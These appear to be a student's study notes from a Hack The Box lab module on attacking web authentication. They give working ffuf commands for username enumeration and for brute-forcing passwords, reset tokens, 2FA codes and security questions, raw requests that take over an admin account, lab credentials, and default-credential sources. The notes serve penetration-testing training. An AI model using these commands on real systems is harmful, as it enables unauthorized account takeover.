# What is Authentication 

**What is Authentication**

**Common Authentication Methods**

**Single-Factor Authentication vs Multi-Factor Authentication**


# Attacks on Authentication

**Attacks on Authentication**

**Attacking Knowledge-based Authentication**

**Attacking Ownership-based Authentication**

**Attacking Inherence-based Authentication**
# Enumerating Users 
**Endpoints / URLs**  
[http://wordpress.htb/](http://wordpress.htb/)  
```
http://<SERVER_IP>:<PORT>/  
```
[http://172.17.0.2/index.php](http://172.17.0.2/index.php)

**Tools / Services**  
ffuf  
SecLists

**Wordlists / Paths**  
/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

**HTTP Request Pattern**  
Content-Type: application/x-www-form-urlencoded  
username=FUZZ&password=invalid

**Filters / Matchers**  
-fr "Unknown user"

**Commands**

```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

http://154.57.164.66:32147/index.php
```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.66:32147/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user."
```
**Credentials**  
htb-stdnt  
Academy_student!


# Brute-Forcing Passwords 

**Tools / Services**  
ffuf  
grep  
awk  
wc

**Wordlists / Paths**  
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt  
./custom_wordlist.txt  
custom_wordlist.txt

**Endpoints / URLs**  
`http://<SERVER_IP>:<PORT>/  `
[http://172.17.0.2/index.php](http://172.17.0.2/index.php)  
`http://<SERVER_IP>:<PORT>/admin.php`

**Commands**

```bash
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt


```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```bash
wc -l custom_wordlist.txt
```

```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
```

```bash
ffuf -w ./custom_wordlist.txt -u http://154.57.164.79:30693/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```


**HTTP Request Pattern**  
Content-Type: application/x-www-form-urlencoded  
username=admin&password=FUZZ

**Filters / Matchers**  
-fr "Invalid username"

**Credentials / Findings**  
admin  
Buttercup1

# Brute-Forcing Password Reset Tokens

**Endpoints / URLs**  
http://weak_reset.htb/reset_password.php?token=7351  
http://weak_reset.htb/reset_password.php?token=FUZZ  
http://<SERVER_IP>:/reset_password.php

**Tools / Services**  
ffuf  
seq  
head

**Wordlists / Paths**  
tokens.txt  
./tokens.txt

**Commands**

```bash
seq -w 0 9999 > tokens.txt
```

```bash
head tokens.txt
```

```bash
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

ffuf -w ./tokens.txt -u http://154.57.164.83:31646/reset_password.php?token=FUZZ -fr "The provided token is invalid"


```
curl -i "[http://monitorsfour.htb/user?token=000000](http://monitorsfour.htb/user?token=000000)" | jq '.[]' > users.json
```


**Filters / Matchers**  
-fr "The provided token is invalid"

**Parameters**  
token=7351  
token=FUZZ


# Brute-Forcing 2FA Codes

**Commands**

```bash
seq -w 0 9999 > tokens.txt
```

```bash
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

ffuf -w ./tokens.txt -u http://154.57.164.81:30878/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=r6p1713nkjor106bfu6m3k7nm8" -d "otp=FUZZ" -fr "Invalid 2FA Code"


**Paths / Endpoints / Parameters**  
http://<SERVER_IP>:/2fa.php  
http://bf_2fa.htb/2fa.php  
/admin.php  
POST /2fa.php  
otp  
PHPSESSID

**Headers / Cookies / Body**  
Content-Type: application/x-www-form-urlencoded  
Cookie: PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93  
otp=0000  
otp=FUZZ

**Wordlists / Files**  
tokens.txt  
./tokens.txt

**Tools / Services / Servers / Listeners**  
ffuf  
seq


# Weak Brute-Force Protection

**Commands**

**Paths / Endpoints / Parameters**

**Headers / Cookies / Body**  
X-Forwarded-For

**Wordlists / Files**

**Tools / Services / Servers / Listeners** 
# Default Credentials 
**Commands**

**Paths / Endpoints / Parameters**

**Headers / Cookies / Body**

**Wordlists / Files**

**Tools / Services / Servers / Listeners**  
CIRT.net  
[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)  
SCADAPASS https://github.com/scadastrangelove/SCADAPASS/tree/master
https://github.com/BookStackApp/BookStack

**Default Credentials**  
admin  
password  
[admin@admin.com](mailto:admin@admin.com)  
[admin@admin.com](mailto:admin@admin.com):password


# Vulnerable Password Reset

**Commands**
```URL
curl -L -o world-cities.csv https://raw.githubusercontent.com/datasets/world-cities/refs/heads/main/data/world-cities.csv
```

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

```bash
wc -l city_wordlist.txt
```

```bash
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```


```
ffuf -w ./city_wordlist.txt -u http://154.57.164.78:32737/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=nheddfn8k3ko6m6bq9tuttsn6m" -d "security_response=FUZZ" -fr " Incorrect response."
```

```bash
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

```
cat world-cities.csv | grep 'United Kingdom' | cut -d ',' -f1 > UK_cities.txt
```


```bash
wc -l german_cities.txt
```

**HTTP Requests**

```
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

```
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

```
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

```
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

**Paths / Endpoints / Parameters**  
/reset.php  
/security_question.php  
/reset_password.php  
[http://pwreset.htb/security_question.php](http://pwreset.htb/security_question.php)  
username  
security_response  
password  
PHPSESSID

**Headers / Cookies / Body**  
```
Content-Type: application/x-www-form-urlencoded  
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv  
security_response=FUZZ  
security_response=London&username=htb-stdnt  
password=P@$$w0rd&username=htb-stdnt  
password=P@$$w0rd&username=admin
```

**Wordlists / Files**  
world-cities.csv  
city_wordlist.txt  
german_cities.txt  
./city_wordlist.txt

**Tools / Services / Servers / Listeners**  
ffuf



### Exploitation Methodology Placement

Password reset testing should include:

- Token brute-forcing
    
- Security question brute-forcing
    
- Rate limit testing
    
- CAPTCHA validation checks
    
- Parameter tampering
    
- Session state validation
    

Password reset functionality is high-risk because small logic flaws can lead directly to full account takeover.
# 
#
#
#